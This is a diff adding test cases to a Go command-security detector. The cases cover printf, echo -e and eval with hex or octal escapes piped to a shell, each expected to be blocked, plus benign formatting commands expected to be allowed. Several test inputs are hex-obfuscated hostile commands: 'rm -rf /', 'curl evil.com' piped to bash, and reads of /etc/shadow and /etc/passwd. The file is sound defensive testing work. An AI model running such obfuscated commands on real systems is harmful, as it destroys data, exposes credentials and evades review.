@@ -2500,6 +2500,185 @@ var BraceExpansionEvasionCases = []TestCase{
 	},
 }
 
+// ---------------------------------------------------------------------------
+// Printf/Echo Hex Command Construction → Shell Execution
+// Taxonomy: unauthorized-execution/remote-code-exec/printf-command-construction
+//
+// printf/echo -e with hex escapes piped to sh, or wrapped in eval/$(...)
+// to construct and execute obfuscated commands. Bypasses ANSI-C quoting
+// detection ($'\xNN') because encoding happens inside printf arguments.
+// MITRE T1027.004, CWE-78.
+// ---------------------------------------------------------------------------
+
+// PrintfHexConstructionCases tests detection of printf/echo hex command construction.
+var PrintfHexConstructionCases = []TestCase{
+
+	// --- TRUE POSITIVES: printf hex piped to shell ---
+
+	{
+		ID:               "TP-PRINTF-HEX-001",
+		Command:          `printf '\x72\x6d\x20\x2d\x72\x66\x20\x2f' | sh`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `printf hex encoding of "rm -rf /" piped to sh`,
+		Tags:             []string{"tp", "printf-hex", "obfuscation"},
+	},
+	{
+		ID:               "TP-PRINTF-HEX-002",
+		Command:          `printf '\x63\x75\x72\x6c\x20\x65\x76\x69\x6c\x2e\x63\x6f\x6d' | bash`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `printf hex encoding of "curl evil.com" piped to bash`,
+		Tags:             []string{"tp", "printf-hex", "obfuscation"},
+	},
+	{
+		ID:               "TP-PRINTF-HEX-003",
+		Command:          `printf "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77" | sh`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `printf hex encoding of "cat /etc/shadow" piped to sh (double quotes)`,
+		Tags:             []string{"tp", "printf-hex", "obfuscation"},
+	},
+	{
+		ID:               "TP-PRINTF-HEX-004",
+		Command:          `printf '\x77\x67\x65\x74\x20\x2d\x71\x4f\x2d' | zsh`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `printf hex piped to zsh — less common shell variant`,
+		Tags:             []string{"tp", "printf-hex", "obfuscation"},
+	},
+
+	// --- TRUE POSITIVES: echo -e hex piped to shell ---
+
+	{
+		ID:               "TP-ECHO-HEX-001",
+		Command:          `echo -e '\x63\x75\x72\x6c\x20\x65\x76\x69\x6c\x2e\x63\x6f\x6d' | bash`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `echo -e hex encoding piped to bash`,
+		Tags:             []string{"tp", "echo-hex", "obfuscation"},
+	},
+	{
+		ID:               "TP-ECHO-HEX-002",
+		Command:          `echo -ne '\x72\x6d\x20\x2d\x72\x66' | sh`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `echo -ne (no trailing newline) hex piped to sh`,
+		Tags:             []string{"tp", "echo-hex", "obfuscation"},
+	},
+
+	// --- TRUE POSITIVES: eval with printf hex ---
+
+	{
+		ID:               "TP-PRINTF-EVAL-001",
+		Command:          `eval "$(printf '\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64')"`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `eval executing printf hex command substitution — "cat /etc/passwd"`,
+		Tags:             []string{"tp", "printf-hex", "eval", "obfuscation"},
+	},
+	{
+		ID:               "TP-PRINTF-EVAL-002",
+		Command:          `eval $(printf '\x69\x64')`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `eval with printf hex — minimal "id" command`,
+		Tags:             []string{"tp", "printf-hex", "eval", "obfuscation"},
+	},
+
+	// --- TRUE POSITIVES: printf octal piped to shell ---
+
+	{
+		ID:               "TP-PRINTF-OCTAL-001",
+		Command:          `printf '\0162\0155\040\055\0162\0146' | sh`,
+		ExpectedDecision: "BLOCK",
+		Classification:   "TP",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      `printf octal encoding of "rm -rf" piped to sh`,
+		Tags:             []string{"tp", "printf-octal", "obfuscation"},
+	},
+
+	// --- TRUE NEGATIVES: legitimate printf/echo usage ---
+
+	{
+		ID:               "TN-PRINTF-HEX-001",
+		Command:          `printf '\x1b[31m%s\x1b[0m\n' 'Error message'`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      "printf with ANSI color codes — legitimate formatting, no shell pipe",
+		Tags:             []string{"tn", "safe", "formatting"},
+	},
+	{
+		ID:               "TN-PRINTF-HEX-002",
+		Command:          `printf '%s\n' 'hello world'`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      "printf with no hex escapes — plain text formatting",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-PRINTF-HEX-003",
+		Command:          `printf '\x00' > /dev/null`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      "printf hex to /dev/null — not piped to shell",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-PRINTF-HEX-004",
+		Command:          `echo -e '\n\tFormatted output'`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      "echo -e with newline/tab escapes — no hex, not piped",
+		Tags:             []string{"tn", "safe"},
+	},
+	{
+		ID:               "TN-PRINTF-HEX-005",
+		Command:          `printf '\x1b[32mSUCCESS\x1b[0m\n'`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      "printf with ANSI green color escape — terminal formatting, no pipe",
+		Tags:             []string{"tn", "safe", "formatting"},
+	},
+	{
+		ID:               "TN-PRINTF-HEX-006",
+		Command:          `echo "the printf function handles hex escapes" | grep printf`,
+		ExpectedDecision: "ALLOW",
+		Classification:   "TN",
+		TaxonomyRef:      "unauthorized-execution/remote-code-exec/printf-command-construction",
+		Analyzer:         "regex",
+		Description:      "echo with word 'printf' piped to grep — not hex construction",
+		Tags:             []string{"tn", "safe"},
+	},
+}
+
 // AllUnauthorizedExecutionCases returns all test cases for Kingdom 4.
 func AllUnauthorizedExecutionCases() []TestCase {
 	var all []TestCase
@@ -2523,5 +2702,6 @@ func AllUnauthorizedExecutionCases() []TestCase {
 	all = append(all, FindExecShellCases...)
 	all = append(all, IFSManipulationCases...)
 	all = append(all, BraceExpansionEvasionCases...)
+	all = append(all, PrintfHexConstructionCases...)
 	return all
 }
